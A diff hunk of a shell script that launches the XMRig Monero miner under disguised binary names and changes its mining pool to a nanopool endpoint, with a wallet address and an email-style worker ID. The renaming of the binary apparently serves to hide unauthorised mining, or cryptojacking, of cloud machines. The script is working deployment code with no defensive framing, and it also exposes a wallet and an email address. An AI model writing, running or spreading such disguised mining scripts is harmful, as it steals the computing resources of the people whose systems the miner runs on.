@@ -14,8 +14,8 @@ rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
-POOL=pool.minexmr.com:6666
-USERNAME=85jtJsumYhUUcErXB18SvLWAAvSrSWWMUNt5JgPDSd4FQpVyAsL7b368s5mi1UPXaef95UYT8mp6WhoZRLLAGWS8R8P2udL
+POOL=xmr-us-west1.nanopool.org:14433
+USERNAME=85jtJsumYhUUcErXB18SvLWAAvSrSWWMUNt5JgPDSd4FQpVyAsL7b368s5mi1UPXaef95UYT8mp6WhoZRLLAGWS8R8P2udL.orcfullaz/jmayo66@yahoo.com
 ALGO=rx/0
 DONATE=1
 ./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.orc -p x -a $ALGO -k --tls
